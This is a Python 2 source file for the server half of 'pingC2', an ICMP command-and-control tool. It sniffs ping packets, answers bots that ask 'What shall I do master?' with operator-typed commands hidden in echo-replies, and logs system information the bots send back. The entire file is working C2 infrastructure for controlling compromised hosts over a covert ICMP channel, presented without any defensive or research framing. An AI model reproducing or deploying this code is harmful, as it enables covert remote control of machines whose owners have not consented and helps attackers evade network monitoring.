#!/usr/bin/python

# pingC2 ICMP C2 server application
#  written by NoCow
# This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
#  and listen for the data payload of "What shall I do master?". If this data is received,
#  a command is sent to the client. Command must start with "run"

import thread
import threading
import sys
import signal
from scapy.all import *

# Inerrupt handler to kill process cleanly
def handler(signum, frame):
	print 'Bye!'
	sys.exit()

def stopperCheck():
	if runThread == True:
		return False
	elif runThread == False:
		return True

# Command and Control main function
def c2main(command):
	conf.verb = 0
        count = 1
        filter = "icmp"
        print "[*] Sniffing with filter (%s) for %d bytes" % (filter, int(count))
        while runThread == True:
		packet = sniff(count,filter=filter)
		for p in packet:
                        #p.show2()
                        try:
                                request = p['Raw'].load
                                ip_id = p['IP'].id
                                icmp_id = p['ICMP'].id
                                print "[*] Request: " + request
                                if request == 'What shall I do master?':
                                        resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/command
                                        print "[*] Response sent: " + command
                                        #resp.show2()
                                        send(resp)
                                elif 'sysinfo' in request:
                                        sysinfo = request[8:]
                                        print "[*] Received sysinfo from client: %s" % sysinfo
                                        resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                        #resp.show2()
                                        print "[*] Response sent: Thanks"
                                        send(resp)      
                                else:   
                                        print "[**] Client not recognized"
                        except:
                                print "[X] ERROR: ", sys.exc_info()[0]

def main(argv):
	print "	 _____    _                    _____   ___  "
 	print "	|  __ \  (_)                  / ____| |__ \ "
 	print "	| |__) |  _   _ __     __ _  | |         ) |"
 	print "	|  ___/  | | | '_ \   / _` | | |        / / "
 	print "	| |      | | | | | | | (_| | | |____   / /_ "
 	print "	|_|      |_| |_| |_|  \__, |  \_____| |____|"
        print "        		        _/ |                "
        print "			     |___/		    "
        print "						    "
	print "			Command Center              "
	print "			   by NoCow		    "
        global runThread
	runThread = True 
	while True:
		signal.signal(signal.SIGINT, handler)
		command = raw_input("Enter a command for bots: ")
		processThread = threading.Thread(target=c2main, args=([command]))
		if (threading.activeCount() < 2):
			print "[*] No threads currently running. Starting capture"
			processThread.daemon = True
			processThread.start()
		else:
			print "[*] Capture currently running. Stopping first"
			runThread = False

if __name__ == "__main__":
   main(sys.argv[1:])
